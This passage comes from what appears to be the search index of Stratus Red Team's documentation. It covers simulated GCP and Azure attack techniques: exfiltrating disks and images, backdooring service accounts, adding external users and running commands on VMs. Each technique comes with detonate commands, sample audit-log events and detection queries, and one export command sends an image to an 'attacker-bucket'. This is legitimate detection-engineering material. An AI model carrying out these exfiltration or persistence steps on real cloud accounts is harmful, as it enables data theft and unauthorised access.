\"projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk\",\n    \"request\": {\n      \"@type\": \"type.googleapis.com/compute.snapshots.insert\"\n    },\n    \"metadata\": {\n      \"@type\": \"type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata\"\n    }\n  }\n}\n</code></pre> <p>Based on these events, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Disk is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.disks.setIamPolicy\"\n</code></pre> <ul> <li>Alerting when someone with an unexpected e-mail domain creates a snapshot of a Compute Disk. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.snapshots.insert\"\nNOT protoPayload.authenticationInfo.principalEmail=~\".+@your-domain.tld$\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/","title":"Exfiltrate Compute Image by sharing it","text":"<p>slow idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#description","title":"Description","text":"<p>Exfiltrates a Compute Image by sharing with a fictitious attacker account. The attacker could then create a snapshot of the image in their GCP project.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Image</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the image so that the attacker account has permissions to read the image in their own project</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-image\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-image\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-image/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Image, using the GCP Admin Activity audit logs event <code>v1.compute.images.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-image@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-image@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/global/images/stratus-red-team-victim-image\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.images.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>After the attacker has permissions on the Compute Image, they can export it in their own GCP Storage using:</p> <pre><code>    gcloud compute images export \\\n    --destination-uri gs://attacker-bucket/victim-image \\\n    --image stratus-red-team-victim-image\n</code></pre> <p>Based on this event, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Image is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.images.setIamPolicy\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/","title":"Exfiltrate Compute Disk by sharing a snapshot","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#description","title":"Description","text":"<p>Exfiltrates a Compute Disk by sharing a snapshot with a fictitious attacker account.</p> <p>Warm-up:</p> <ul> <li>Create a Compute Disk and a Snapshot</li> </ul> <p>Detonation:</p> <ul> <li>Set the IAM policy of the snapshot so that the attacker account has permissions to access it</li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.exfiltration.share-compute-snapshot\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.exfiltration.share-compute-snapshot\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.exfiltration.share-compute-snapshot/#detection","title":"Detection","text":"<p>You can detect when someone changes the IAM policy of a Compute Snapshot, using the GCP Admin Activity audit logs event <code>v1.compute.snapshots.setIamPolicy</code>. Here's a sample event, shortened for clarity:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user-sharing-the-snapshot@domain.tld\",\n      \"principalSubject\": \"user:user-sharing-the-snapshot@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"34.33.32.31\",\n      \"callerSuppliedUserAgent\": \"google-cloud-sdk gcloud/...\"\n    },\n    \"resourceName\": \"projects/victim-project/global/snapshots/stratus-red-team-victim-snapshot\",\n    \"request\": {\n      \"policy\": {\n        \"version\": \"3\",\n        \"bindings\": [\n          {\n            \"role\": \"roles/owner\",\n            \"members\": [\n              \"user:attacker@gmail.com\"\n            ]\n          }\n        ]\n      },\n      \"@type\": \"type.googleapis.com/compute.snapshots.setIamPolicy\"\n    }\n  }\n}\n</code></pre> <p>Based on these events, detection strategies may include:</p> <ul> <li>Alerting when the IAM policy of a Compute Snapshot is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:</li> </ul> <pre><code>protoPayload.methodName=\"v1.compute.snapshots.setIamPolicy\"\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/","title":"Backdoor a GCP Service Account through its IAM Policy","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#description","title":"Description","text":"<p>Backdoors a GCP service account by granting a fictitious attacker the ability to impersonate it and generate access temporary tokens for it.</p> <p>Warm-up:</p> <ul> <li>Create a service account</li> </ul> <p>Detonation:</p> <ul> <li>Backdoor the IAM policy of the service account to grant the role <code>iam.serviceAccountTokenCreator</code> to a fictitious attacker</li> </ul> <p>Note that in GCP (contrary to AWS), the \"IAM policy\" of a service account is not granting permissions to the service account itself - rather, it's a resource-based policy that grants permissions to other identities to impersonate the service account.</p> <p>Info</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.persistence.backdoor-service-account-policy\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.backdoor-service-account-policy\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#detection","title":"Detection","text":"<p>You can detect when the IAM policy of a service account is updated using the GCP Admin Audit Logs event <code>google.iam.admin.v1.SetIAMPolicy</code> (sample below, shortened for clarity).</p> <pre><code>{\n  \"protoPayload\": {\n    \"serviceName\": \"iam.googleapis.com\",\n    \"methodName\": \"google.iam.admin.v1.SetIAMPolicy\",\n    \"resourceName\": \"projects/-/serviceAccounts/123456789\",\n    \"serviceData\": {\n      \"@type\": \"type.googleapis.com/google.iam.v1.logging.AuditData\",\n      \"policyDelta\": {\n        \"bindingDeltas\": [\n          {\n            \"action\": \"ADD\",\n            \"role\": \"roles/iam.serviceAccountTokenCreator\",\n            \"member\": \"user:stratusredteam@gmail.com\"\n          }\n        ]\n      }\n    },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"email_id\": \"stratus-red-team-bip-sa@victim-project.iam.gserviceaccount.com\",\n      \"project_id\": \"victim-project\"\n    }\n  },\n  \"logName\": \"projects/victim-project/logs/cloudaudit.googleapis.com%2Factivity\",\n}\n</code></pre> <p>When someone impersonates a service account, the GCP Admin Audit Logs event <code>google.iam.credentials.v1.GenerateAccessToken</code> is emitted if you explicitly enabled <code>DATA_READ</code> events in the audit logs configuration of your project. For more information, see Impersonate GCP Service Accounts.</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/","title":"Create an Admin GCP Service Account","text":"<p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#description","title":"Description","text":"<p>Establishes persistence by creating a new service account and assigning it  <code>owner</code> permissions inside the current GCP project.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Create a service account</li> <li>Update the current GCP project's IAM policy to bind the service account to the <code>owner</code> role'</li> </ul> <p>References:</p> <ul> <li>https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.create-admin-service-account\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#detection","title":"Detection","text":"<p>Using the following GCP Admin Activity audit logs events:</p> <ul> <li><code>google.iam.admin.v1.CreateServiceAccount</code></li> <li><code>SetIamPolicy</code> with <code>resource.type=project</code></li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/","title":"Create a GCP Service Account Key","text":"<p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#description","title":"Description","text":"<p>Establishes persistence by creating a service account key on an existing service account.</p> <p>Warm-up:</p> <ul> <li>Create a service account</li> </ul> <p>Detonation:</p> <ul> <li>Create a new key for the service account</li> </ul> <p>References:</p> <ul> <li>https://expel.com/blog/incident-report-spotting-an-attacker-in-gcp/</li> <li>https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.create-service-account-key\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#detection","title":"Detection","text":"<p>Using GCP Admin Activity audit logs event <code>google.iam.admin.v1.CreateServiceAccountKey</code>.</p>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/","title":"Invite an External User to a GCP Project","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#description","title":"Description","text":"<p>Persists in the GCP project by inviting an external (fictitious) user to the project. The attacker could then use the external user to access the project.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Updates the project IAM policy to grant the attacker account the role <code>roles/editor</code></li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.persistence.invite-external-user\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.invite-external-user\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#detection","title":"Detection","text":"<p>The Google Cloud Admin logs event <code>SetIamPolicy</code> is generated when a principal is granted non-owner permissions at the project level.</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"serviceName\": \"cloudresourcemanager.googleapis.com\",\n    \"methodName\": \"SetIamPolicy\",\n    \"serviceData\": {\n      \"@type\": \"type.googleapis.com/google.iam.v1.logging.AuditData\",\n      \"policyDelta\": {\n        \"bindingDeltas\": [\n          {\n            \"action\": \"ADD\",\n            \"role\": \"roles/editor\",\n            \"member\": \"user:stratusredteam@gmail.com\"\n          }\n        ]\n      }\n    },\n    \"request\": {\n      \"resource\": \"target-project\",\n      \"policy\": {\n        // ...\n      },\n      \"@type\": \"type.googleapis.com/google.iam.v1.SetIamPolicyRequest\"\n    }\n  }\n}\n</code></pre> <p>Although this attack technique does not simulate it, an attacker can also  use the GCP console to invite an external user as owner of a GCP project, which cannot be done through the SetIamPolicy API call. In that case, an <code>InsertProjectOwnershipInvite</code> event is generated:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"serviceName\": \"cloudresourcemanager.googleapis.com\",\n    \"methodName\": \"InsertProjectOwnershipInvite\",\n    \"resourceName\": \"projects/target-project\",\n    \"request\": {\n      \"member\": \"user:attacker@gmail.com\",\n      \"projectId\": \"target-project\",\n      \"@type\": \"type.googleapis.com/google.internal.cloud.resourcemanager.InsertProjectOwnershipInviteRequest\"\n    },\n    \"response\": {\n      \"@type\": \"type.googleapis.com/google.internal.cloud.resourcemanager.InsertProjectOwnershipInviteResponse\"\n    }\n  }\n}\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/","title":"Impersonate GCP Service Accounts","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#description","title":"Description","text":"<p>Attempts to impersonate several GCP service accounts. Service account impersonation in GCP allows to retrieve temporary credentials allowing to act as a service account.</p> <p>Warm-up:</p> <ul> <li>Create 10 GCP service accounts</li> <li>Grant the current user <code>roles/iam.serviceAccountTokenCreator</code> on one of these service accounts</li> </ul> <p>Detonation:</p> <ul> <li>Attempt to impersonate each of the service accounts</li> <li>One impersonation request will succeed, simulating a successful privilege escalation</li> </ul> <p>Info</p> <p>GCP takes a few seconds to propagate the new <code>roles/iam.serviceAccountTokenCreator</code> role binding to the current user.</p> <p>It is recommended to first warm up this attack technique (<code>stratus warmup ...</code>), wait for 30 seconds, then detonate it.</p> <p>References:</p> <ul> <li>https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</li> <li>https://cloud.google.com/iam/docs/impersonating-service-accounts</li> </ul>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.privilege-escalation.impersonate-service-accounts\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#detection","title":"Detection","text":"<p>Using GCP Admin Activity audit logs event <code>GenerateAccessToken</code>.  To get this event, you need to enable IAM audit logs for data access activity. More specifically, you need to enable <code>DATA_READ</code> for your GCP project, e.g. using Terraform:</p> <pre><code>data \"google_client_config\" \"current\" {}\n\nresource \"google_project_iam_audit_config\" \"audit\" {\n  project = data.google_client_config.current.project\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n}\n</code></pre> <p>Sample successful event (shortened for clarity):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user@domain.tld\",\n      \"principalSubject\": \"user:user@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"(calling IP)\",\n    },\n    \"serviceName\": \"iamcredentials.googleapis.com\",\n    \"methodName\": \"GenerateAccessToken\",\n    \"authorizationInfo\": [\n      {\n        \"permission\": \"iam.serviceAccounts.getAccessToken\",\n        \"granted\": true,\n        \"resourceAttributes\": {}\n      }\n    ],\n    \"request\": {\n      \"name\": \"projects/-/serviceAccounts/impersonated-service-account@project-id.iam.gserviceaccount.com\",\n      \"@type\": \"type.googleapis.com/google.iam.credentials.v1.GenerateAccessTokenRequest\"\n    }\n  },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"unique_id\": \"105711361070066902665\",\n      \"email_id\": \"impersonated-service-account@project-id.iam.gserviceaccount.com\",\n      \"project_id\": \"project-id\"\n    }\n  },\n  \"severity\": \"INFO\",\n  \"logName\": \"projects/project-id/logs/cloudaudit.googleapis.com%2Fdata_access\"\n}\n</code></pre> <p>When impersonation fails, the generated event does not contain the identity of the caller, as explained in the GCP documentation:</p> <p>Audit logging doesn't redact the caller's principal email address for any access that succeeds or for any write operation. For read-only operations that fail with a \"permission denied\" error, Audit Logging might redact the caller's principal  email address unless the caller is a service account.</p> <p>Sample unsuccessful event (shortened for clarity):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"status\": {\n      \"code\": 7,\n      \"message\": \"PERMISSION_DENIED\"\n    },\n    \"authenticationInfo\": {},\n    \"requestMetadata\": {\n      \"callerIp\": \"(calling IP)\"\n    },\n    \"serviceName\": \"iamcredentials.googleapis.com\",\n    \"methodName\": \"GenerateAccessToken\",\n    \"authorizationInfo\": [\n      {\n        \"permission\": \"iam.serviceAccounts.getAccessToken\",\n        \"resourceAttributes\": {}\n      }\n    ],\n    \"resourceName\": \"projects/-/serviceAccounts/103566171230474107362\",\n    \"request\": {\n      \"@type\": \"type.googleapis.com/google.iam.credentials.v1.GenerateAccessTokenRequest\",\n      \"name\": \"projects/-/serviceAccounts/target-service-account@project-id.iam.gserviceaccount.com\"\n    },\n    \"metadata\": {\n      \"identityDelegationChain\": [\n        \"projects/-/serviceAccounts/target-service-account@project-id.iam.gserviceaccount.com\"\n      ]\n    }\n  },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"email_id\": \"target-service-account@project-id.iam.gserviceaccount.com\",\n      \"project_id\": \"project-id\"\n    }\n  },\n  \"severity\": \"ERROR\",\n  \"logName\": \"projects/project-id/logs/cloudaudit.googleapis.com%2Fdata_access\"\n}\n</code></pre> <p>Some detection strategies may include:</p> <ul> <li>Alerting on unsuccessful impersonation attempts</li> <li>Alerting when the same IP address / user-agent attempts to impersonate several service accounts in a  short amount of time (successfully or not)</li> </ul>"},{"location":"attack-techniques/azure/","title":"Azure","text":"<p>This page contains the Stratus attack techniques for Azure, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/azure/#execution","title":"Execution","text":"<ul> <li> <p>Execute Command on Virtual Machine using Custom Script Extension</p> </li> <li> <p>Execute Commands on Virtual Machine using Run Command</p> </li> </ul>"},{"location":"attack-techniques/azure/#exfiltration","title":"Exfiltration","text":"<ul> <li>Export Disk Through SAS URL</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/","title":"Execute Command on Virtual Machine using Custom Script Extension","text":"<p>slow </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#description","title":"Description","text":"<p>By utilizing the 'CustomScriptExtension' extension on a Virtual Machine, an attacker can pass PowerShell commands to the VM as SYSTEM.</p> <p>References:</p> <ul> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Execution/AZT301/AZT301-2/</li> </ul> <p>Warm-up: </p> <ul> <li>Create a virtual machine</li> </ul> <p>Detonation: </p> <ul> <li>Configure a custom script extension for the virtual machine</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.execution.vm-custom-script-extension\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#detection","title":"Detection","text":"<p>Identify Azure events of type <code>Microsoft.Compute/virtualMachines/extensions/write</code>. Sample below (redacted for clarity).</p> <pre><code>{\n  \"duration\": 0,\n  \"resourceId\": \"/SUBSCRIPTIONS/&lt;your-subscription-id&gt;/RESOURCEGROUPS/RG-HAT6H48Q/PROVIDERS/MICROSOFT.COMPUTE/VIRTUALMACHINES/VM-HAT6H48Q/EXTENSIONS/CUSTOMSCRIPTEXTENSION-STRATUS-EXAMPLE\",\n  \"evt\": {\n    \"category\": \"Administrative\",\n    \"outcome\": \"Start\",\n    \"name\": \"MICROSOFT.COMPUTE/VIRTUALMACHINES/EXTENSIONS/WRITE\"\n  },\n  \"resource_name\": \"customscriptextension-stratus-example\",\n  \"time\": \"2022-06-18T19:57:27.8617215Z\",\n  \"properties\": {\n    \"hierarchy\": \"ecc2b97b-844b-414e-8123-b925dddf87ed/&lt;your-subscription-id&gt;\",\n    \"message\": \"Microsoft.Compute/virtualMachines/extensions/write\",\n    \"eventCategory\": \"Administrative\",\n    \"entity\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-hat6h48q/providers/Microsoft.Compute/virtualMachines/vm-hat6h48q/extensions/CustomScriptExtension-Stratus-Example\"\n  },\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/","title":"Execute Commands on Virtual Machine using Run Command","text":"<p>slow idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#description","title":"Description","text":"<p>By utilizing the 'RunCommand' feature on a Virtual Machine, an attacker can pass:</p> <ul> <li>Windows: PowerShell commands to the VM as SYSTEM.</li> <li>Linux: Shell commands to the VM as root.</li> </ul> <p>References:</p> <ul> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command</li> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Execution/AZT301/AZT301-1/</li> <li>https://go.crowdstrike.com/rs/281-OBQ-266/images/report-crowdstrike-2023-threat-hunting-report.pdf (page 34)</li> </ul> <p>Warm-up: </p> <ul> <li>Create a virtual machine</li> </ul> <p>Detonation: </p> <ul> <li>Invoke a RunCommand on the target virtual machine</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.execution.vm-run-command\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#detection","title":"Detection","text":"<p>Identify <code>Microsoft.Compute/virtualMachines/runCommand/action</code>  and <code>Microsoft.Compute/virtualMachines/runCommands/write</code> events in Azure Activity logs.</p> <p>Sample event (redacted for clarity):</p> <pre><code>{\n    \"caller\": \"you@domain.tld\",\n    \"eventTimestamp\": \"2022-06-01T11:39:35.6986539Z\",\n    \"id\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb/events/25235036-3b0c-46e7-97d0-5bea476a6ab8/ticks/637896803756986539\",\n    \"level\": \"Informational\",\n    \"operationName\": {\n        \"value\": \"Microsoft.Compute/virtualMachines/runCommand/action\",\n        \"localizedValue\": \"Run Command on Virtual Machine\"\n    },\n    \"resourceGroupName\": \"rg-4x3tj2hb\",\n    \"resourceProviderName\": {\n        \"value\": \"Microsoft.Compute\",\n        \"localizedValue\": \"Microsoft.Compute\"\n    },\n    \"resourceType\": {\n        \"value\": \"Microsoft.Compute/virtualMachines\",\n        \"localizedValue\": \"Microsoft.Compute/virtualMachines\"\n    },\n    \"resourceId\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb\",\n    \"status\": {\n        \"value\": \"Succeeded\",\n        \"localizedValue\": \"Succeeded\"\n    },\n    \"properties\": {\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb\",\n        \"message\": \"Microsoft.Compute/virtualMachines/runCommand/action\",\n        \"hierarchy\": \"&lt;your-tenant-id&gt;/&lt;your-subscription-id&gt;\"\n    },\n    \"relatedEvents\": []\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/","title":"Export Disk Through SAS URL","text":"<p>idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#description","title":"Description","text":"<p>Generate a public Shared Access Signature (SAS) URL to download an Azure disk.</p> <p>Warm-up:</p> <ul> <li>Create an Azure-managed disk</li> </ul> <p>Detonation:</p> <ul> <li>Generated a Shared Access Signature (SAS) URL for the disk</li> </ul> <p>References:</p> <ul> <li>https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurevmdisk</li> <li>https://zigmax.net/azure-disk-data-exfiltration/</li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.exfiltration.disk-export\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#detection","title":"Detection","text":"<p>Identify <code>Microsoft.Compute/disks/beginGetAccess/action</code> events in Azure Activity logs.</p> <p>Sample event (redacted for clarity):</p> <pre><code>{\n  \"resourceId\": \"/SUBSCRIPTIONS/&lt;your-subscription-id&gt;/RESOURCEGROUPS/RG-IKFFQ01Z/PROVIDERS/MICROSOFT.COMPUTE/DISKS/STRATUS-RED-TEAM-DISK\",\n  \"evt\": {\n    \"category\": \"Administrative\",\n    \"outcome\": \"Success\",\n    \"name\": \"MICROSOFT.COMPUTE/DISKS/BEGINGETACCESS/ACTION\"\n  },\n  \"level\": \"Information\",\n  \"properties\": {\n    \"hierarchy\": \"ecc2b97b-844b-414e-8123-b925dddf87ed/2fd72d85-b49f-4e19-b567-4a8cb7301e8b\",\n    \"message\": \"Microsoft.Compute/disks/beginGetAccess/action\",\n    \"eventCategory\": \"Administrative\",\n    \"entity\": \"/subscriptions/&lt;your-subscription-id/resourceGroups/rg-ikffq01z/providers/Microsoft.Compute/disks/stratus-red-team-disk\"\n  }\n}\n</code></pre>"},{"location":"attack-techniques/kubernetes/","title":"Kubernetes","text":"<p>This page contains the Stratus attack techniques for Kubernetes, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/kubernetes/#credential-access","title":"Credential Access","text":"<ul> <li> <p>Dump All Secrets</p> </li> <li> <p>Steal Pod Service Account Token</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/#persistence","title":"Persistence","text":"<ul> <li> <p>Create Admin ClusterRole</p> </li> <li> <p>Create Client Certificate Credential</p> </li> <li> <p>Create Long-Lived Token</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Create Admin ClusterRole</p> </li> <li> <p>Container breakout via hostPath volume mount</p> </li> <li> <p>Privilege escalation through node/proxy permissions</p> </li> <li> <p>Run 